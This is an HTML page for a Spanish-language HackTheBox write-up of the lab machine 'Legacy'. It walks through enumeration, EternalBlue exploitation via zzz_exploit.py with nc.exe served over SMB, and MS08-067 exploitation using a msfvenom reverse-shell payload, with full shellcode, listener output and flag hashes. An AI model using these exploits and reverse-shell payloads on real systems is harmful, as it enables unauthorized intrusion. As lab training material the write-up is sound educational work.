@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Legacy - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Legacy - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Legacy de hackthebox una maquina windows sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de eternal blue usando el zzz_exploit.py, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por smb donde se nos reprotara que el servicio es vulnerable a el exploit MS08_067 el cual tambien explotaremos a traves de la creación de un shellcode para asi obtener acceso como el usuario adminsitrator." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Legacy de hackthebox una maquina windows sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de eternal blue usando el zzz_exploit.py, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por smb donde se nos reprotara que el servicio es vulnerable a el exploit MS08_067 el cual tambien explotaremos a traves de la creación de un shellcode para asi obtener acceso como el usuario adminsitrator." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Legacy" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Legacy" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Legacy/banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-29T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Legacy/banner.png" />
+<meta property="twitter:title" content="Maquina Legacy - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-29T00:00:00+00:00","datePublished":"2023-06-29T00:00:00+00:00","description":"El dia de hoy vamos a resolver Legacy de hackthebox una maquina windows sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de eternal blue usando el zzz_exploit.py, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por smb donde se nos reprotara que el servicio es vulnerable a el exploit MS08_067 el cual tambien explotaremos a traves de la creación de un shellcode para asi obtener acceso como el usuario adminsitrator.","headline":"Maquina Legacy - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Legacy/banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Legacy"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Legacy"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Legacy - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-29">29 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Legacy/banner.png" alt="Maquina Legacy - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Legacy</code> de <code>hackthebox</code> una maquina <code>windows</code> sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de <code>eternal blue</code> usando el <code>zzz_exploit.py</code>, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por <code>smb</code> donde se nos reprotara que el servicio es vulnerable a el exploit <code>MS08_067</code> el cual tambien explotaremos a traves de la creación de un <code>shellcode</code> para asi obtener acceso como el usuario <code>adminsitrator</code>.</p>
+
+<p>Comenzaremos como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Legacy
+❯ ls
+ Legacy
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.4
+PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
+64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=119 ms
+
+--- 10.10.10.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 118.571/118.571/118.571/0.000 ms
+</code></pre>
+
+<p>Vemos que la maquina nos responde, con un ttl de <code>127</code> correspondiente a una maquina <code>windows</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:54 GMT
+Initiating SYN Stealth Scan at 18:54
+Scanning 10.10.10.4 [65535 ports]
+Discovered open port 139/tcp on 10.10.10.4
+Discovered open port 445/tcp on 10.10.10.4
+Discovered open port 135/tcp on 10.10.10.4
+Completed SYN Stealth Scan at 18:55, 21.64s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.4
+Host is up, received user-set (0.18s latency).
+Scanned at 2023-06-29 18:54:52 GMT for 21s
+Not shown: 56233 closed tcp ports (reset), 9299 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE      REASON
+135/tcp open  msrpc        syn-ack ttl 127
+139/tcp open  netbios-ssn  syn-ack ttl 127
+445/tcp open  microsoft-ds syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
+           Raw packets sent: 106649 (4.693MB) | Rcvd: 65813 (2.633MB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p135,139,445 10.10.10.4 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:56 GMT
+Nmap scan report for 10.10.10.4
+Host is up (0.18s latency).
+
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:a9:4a (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2023-07-04T23:53:50+03:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
+</code></pre>
+
+<p>Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina <code>Windows XP</code>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>135</td>
+      <td>RPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td>LDAP</td>
+      <td>Microsoft Windows netbios-ssn</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMB</td>
+      <td>Windows XP microsoft-ds</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">EXPLOTACION <a href="#explotación">#</a></h2>
+
+<p>Como vemos que la maquina corresponde <code>Windows XP</code>, podemos explotar el <code>eternal blue</code>, asi que vamos a explotarlo usando el exploit de github de warawit.</p>
+
+<ul>
+  <li><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></li>
+</ul>
+
+<p>Descargamos al repositorio y ejecutamos el <code>checker.py</code>, para encontrar <code>named pipes</code> vulnerables.</p>
+
+<blockquote>
+  <p>Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.</p>
+</blockquote>
+
+<p>Ejectamos el <code>checker.py</code> el cual nos reporta dos <code>named pipes</code> de los que podemos abusar.</p>
+
+<pre><code class="language-bash">❯ python2 checker.py 10.10.10.4
+Target OS: Windows 5.1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: Ok (32 bit)
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: Ok (32 bit)
+</code></pre>
+
+<p>Ahora nos abriremos el <code>zzz_exploit.py</code>, para modificar la instrucción que queremos ejecutar al lanzar el exploit, en la que nos montaremos un recurso compartido en nuestra maquina donde alojaremos el <code>nc.exe</code> el cual se ejecutara otorgandonos una conexión a nuestra maquina. Esto descomentado la opción <code>service_exec</code> y comentaremos las lineas previas.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Legacy/lega1.PNG" alt="" /></p>
+
+<p>Para ello, podemos descarganos el ejecutable de <code>nc</code>, para ello iremos al siguiente enlace y descargaremos el correspondiente a la versión <code>1.12</code>.</p>
+
+<ul>
+  <li><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></li>
+</ul>
+
+<p><img src="/assets/images/HTB/htb-writeup-Legacy/lega2.PNG" alt="" /></p>
+
+<p>Si optamos por descargarlo de esta manera obtendremos un comprimido, el cual debemos descomprimirlo en una carpeta aparte ya que este contiene muchos archivos.</p>
+
+<p>En mi caso yo usare el <code>nc.exe</code> que contempla el repositorio de <code>danil miesler</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ cp /opt/SecLists/Miscellaneous/web/http-request-headers/nc.exe .
+❯ ls
+ MS17-010   nc.exe   netcat-win32-1.12.zip
+</code></pre>
+
+<p>Procedemos a montar nuestro recurso compartido, donde alojaremos el <code>nc.exe</code>.</p>
+
+<pre><code class="language-bash">❯ impacket-smbserver smbFolder $(pwd) -smb2support
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<p>Nos ponemos en escucha con <code>ncat</code> por el puerto que configuramos, en este caso el correspondiente a el <code>443</code>.</p>
+
+<h2 id="escalada-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Ejecutamos el <code>zzz_exploit.py</code> junto con el named pipe que previamente nos reporto el <code>checker.py</code>.</p>
+
+<pre><code class="language-bash">❯ python2 zzz_exploit.py 10.10.10.4 spoolss
+Target OS: Windows 5.1
+Groom packets
+attempt controlling next transaction on x86
+success controlling one transaction
+modify parameter count to 0xffffffff to be able to write backward
+leak next transaction
+CONNECTION: 0x86101b30
+SESSION: 0xe1b1cc68
+FLINK: 0x7bd48
+InData: 0x7ae28
+MID: 0xa
+TRANS1: 0x78b50
+</code></pre>
+
+<p>y recibimos la conexión.</p>
+
+<pre><code class="language-cmd">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.4.
+Ncat: Connection from 10.10.10.4:1046.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&gt;
+</code></pre>
+
+<p>Ahora podemos ir al directorio del usuario john y visualizar la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-cmd">C:\Documents and Settings\john\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings\john\Desktop
+
+16/03/2017  09:19     &lt;DIR&gt;          .
+16/03/2017  09:19     &lt;DIR&gt;          ..
+16/03/2017  09:19                 32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   6.342.070.272 bytes free
+
+C:\Documents and Settings\john\Desktop&gt;type user.txt
+type user.txt
+e69af0e4f443de7e36876fda4ec7644f
+</code></pre>
+
+<h2 id="explotacion-alterna">EXPLOTACION ALTERNA <a href="#explotacion-alterna">#</a></h2>
+
+<p>Ahora para comprometer la maquina de una manera alternativa, primero usaremos los scripts <code>smb-vuln\*</code> de nmap en el puerto <code>445</code>.</p>
+
+<pre><code class="language-bash">QUITTING!
+❯ nmap --script smb-vuln\* -p445 10.10.10.4 -oN smbScan
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 19:55 GMT
+Nmap scan report for 10.10.10.4
+Host is up (0.12s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+|_smb-vuln-ms10-054: false
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+
+Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
+</code></pre>
+
+<p>Nmap nos reporta que el servicio es vulnerable a <code>ms08-067</code> ya que corresponde a un <code>Windows XP</code>.</p>
+
+<p>Para poder explotarla vamos a descargarnos un exploit de <code>andyacer</code> de github:</p>
+
+<ul>
+  <li><a href="https://github.com/andyacer/ms08_067">https://github.com/andyacer/ms08_067</a></li>
+</ul>
+
+<p>Ahi nos explican a fondo en que consiste la explotación y nos pide que generemos un <code>shellcode</code> el cual debemos ingresar al <code>exploit</code>.</p>
+
+<p>Para ello vamos a generar el shellcode usando <code>msfvenom</code>, si no sabes como en el repositorio te explica como debemos hacerlo exactamente, solo debemos especificar nuestra ip y el puerto.</p>
+
+<pre><code class="language-bash">❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of c file: 1491 bytes
+unsigned char buf[] = 
+"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
+"\x0e\x63\xc8\xc3\x99\x83\xee\xfc\xe2\xf4\x9f\x20\x41\x99"
+"\x63\xc8\xa3\x10\x86\xf9\x03\xfd\xe8\x98\xf3\x12\x31\xc4"
+"\x48\xcb\x77\x43\xb1\xb1\x6c\x7f\x89\xbf\x52\x37\x6f\xa5"
+"\x02\xb4\xc1\xb5\x43\x09\x0c\x94\x62\x0f\x21\x6b\x31\x9f"
+"\x48\xcb\x73\x43\x89\xa5\xe8\x84\xd2\xe1\x80\x80\xc2\x48"
+"\x32\x43\x9a\xb9\x62\x1b\x48\xd0\x7b\x2b\xf9\xd0\xe8\xfc"
+"\x48\x98\xb5\xf9\x3c\x35\xa2\x07\xce\x98\xa4\xf0\x23\xec"
+"\x95\xcb\xbe\x61\x58\xb5\xe7\xec\x87\x90\x48\xc1\x47\xc9"
+"\x10\xff\xe8\xc4\x88\x12\x3b\xd4\xc2\x4a\xe8\xcc\x48\x98"
+"\xb3\x41\x87\xbd\x47\x93\x98\xf8\x3a\x92\x92\x66\x83\x97"
+"\x9c\xc3\xe8\xda\x28\x14\x3e\xa0\xf0\xab\x63\xc8\xab\xee"
+"\x10\xfa\x9c\xcd\x0b\x84\xb4\xbf\x64\x37\x16\x21\xf3\xc9"
+"\xc3\x99\x4a\x0c\x97\xc9\x0b\xe1\x43\xf2\x63\x37\x16\xc9"
+"\x33\x98\x93\xd9\x33\x88\x93\xf1\x89\xc7\x1c\x79\x9c\x1d"
+"\x54\xf3\x66\xa0\xc9\x93\x73\xcb\xab\x9b\x63\xc9\x78\x10"
+"\x85\xa2\xd3\xcf\x34\xa0\x5a\x3c\x17\xa9\x3c\x4c\xe6\x08"
+"\xb7\x95\x9c\x86\xcb\xec\x8f\xa0\x33\x2c\xc1\x9e\x3c\x4c"
+"\x0b\xab\xae\xfd\x63\x41\x20\xce\x34\x9f\xf2\x6f\x09\xda"
+"\x9a\xcf\x81\x35\xa5\x5e\x27\xec\xff\x98\x62\x45\x87\xbd"
+"\x73\x0e\xc3\xdd\x37\x98\x95\xcf\x35\x8e\x95\xd7\x35\x9e"
+"\x90\xcf\x0b\xb1\x0f\xa6\xe5\x37\x16\x10\x83\x86\x95\xdf"
+"\x9c\xf8\xab\x91\xe4\xd5\xa3\x66\xb6\x73\x23\x84\x49\xc2"
+"\xab\x3f\xf6\x75\x5e\x66\xb6\xf4\xc5\xe5\x69\x48\x38\x79"
+"\x16\xcd\x78\xde\x70\xba\xac\xf3\x63\x9b\x3c\x4c";
+</code></pre>
+
+<p>Ese shellcode generado, ahora vamos a introducirlo en el <code>exploit</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Legacy/lega3.PNG" alt="" /></p>
+
+<p>Ejecutamos el exploit sin antes ponernos en escucha con <code>ncat</code> en el puerto <code>443</code>.</p>
+
+<pre><code class="language-bash">❯ python2 ms08_067_2018.py 10.10.10.4 6 445
+#######################################################################
+#   MS08-067 Exploit
+#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
+#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
+#
+#   Mod in 2018 by Andy Acer:
+#   - Added support for selecting a target port at the command line.
+#     It seemed that only 445 was previously supported.
+#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
+#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
+#     into this source file.
+#######################################################################
+
+Windows XP SP3 English (NX)
+
+[-]Initiating connection
+[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
+Exploit finish
+</code></pre>
+
+<p>Recibimos la conexión, ahora podemos ir al directorio del usuario <code>Administrator</code> y leer la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-cmd">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.4.
+Ncat: Connection from 10.10.10.4:1047.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&gt; cd "Documents and Settings"
+cd "Documents and Settings"
+
+C:\Documents and Settings&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings
+
+16/03/2017  09:07     &lt;DIR&gt;          .
+16/03/2017  09:07     &lt;DIR&gt;          ..
+16/03/2017  09:07     &lt;DIR&gt;          Administrator
+16/03/2017  08:29     &lt;DIR&gt;          All Users
+16/03/2017  08:33     &lt;DIR&gt;          john
+               0 File(s)              0 bytes
+               5 Dir(s)   6.403.846.144 bytes free
+
+C:\Documents and Settings&gt;cd Administrator\Desktop
+cd Administrator\Desktop
+
+C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+type root.txt
+993442d258b0e0ec917cae9e695d5713
+C:\Documents and Settings\Administrator\Desktop&gt;
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Legacy - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Legacy" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
